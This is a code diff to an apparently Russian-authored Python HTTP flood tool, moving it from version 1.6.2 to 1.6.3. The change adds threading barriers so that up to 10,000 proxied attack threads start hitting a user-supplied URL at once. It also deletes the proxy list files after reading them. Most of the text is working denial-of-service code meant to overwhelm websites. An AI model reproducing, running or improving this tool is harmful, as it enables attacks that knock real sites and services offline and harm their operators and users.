@@ -4,6 +4,7 @@ import random
 import requests
 import cfscrape
 import os
+import pyAesCrypt
 
 os.system("clear")
 
@@ -14,10 +15,23 @@ with open('useragent') as file:
 
 with open('proxyhttp') as file:
     proxy_http = ''.join(file.readlines()).strip().split('\n')
+os.remove("proxyhttp")
 
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
+os.remove("proxysocks")
 
+# Запуск потоков
+
+def dospause1(barrier, url):
+    barrier.wait()
+    dos1(url)
+
+def dospause2(barrier, url):
+    barrier.wait()
+    dos2(url)
+
+# Аттака
 def dos1(target):
     while True:
         useragent = random.choice(headersp)
@@ -65,8 +79,7 @@ print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-
 print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
 print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
 print("Creator: VaRaMBaZ")
-print("Version: 1.6.2; Improving the menu and optimizing the attack \n")
-
+print("Version: 1.6.3; Speeding up thread launches and reducing workload \n")
 
 url = input("URL: ")
 if not url.__contains__("http"):
@@ -83,16 +96,17 @@ except ValueError:
 if threads == 0 or threads > 10000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
+bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
-if (proxyuseage == 1):
+if proxyuseage == 1:
     for i in range(0, threads):
-        thr = threading.Thread(target=dos1, args=(url,))
+        thr = threading.Thread(target=dospause1, args=(bar, url, ))
         thr.start()
 else:
     for i in range(0, threads):
-        thr2 = threading.Thread(target=dos2, args=(url,))
+        thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
